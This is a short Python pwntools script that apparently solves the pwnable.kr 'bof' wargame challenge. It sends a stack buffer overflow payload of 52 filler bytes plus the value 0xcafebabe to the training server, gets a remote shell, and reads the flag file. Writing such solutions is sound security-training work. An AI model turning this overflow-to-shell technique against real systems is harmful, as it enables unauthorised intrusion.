from pwn import *
import argparse

def run():
    # TODO: add docs to explain payload
    hex = 0xcafebabe
    offset = 52 # calculated by Assembly code
    payload = b"X" * offset + p32(hex)

    shell = remote("pwnable.kr", 9000)
    shell.send(payload)

    if args.interactive:
        shell.interactive()
    else:
        for _ in range(2):
            shell.sendline(b"cat flag")
            flag = shell.recv(timeout=1).decode().strip()
        log.success(f"Flag: \"{flag}\"")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interactive", dest="interactive", action="store_true", required=False, help="Use an interactive shell.")

    args = parser.parse_args()
    # print(args)
    
    run() 
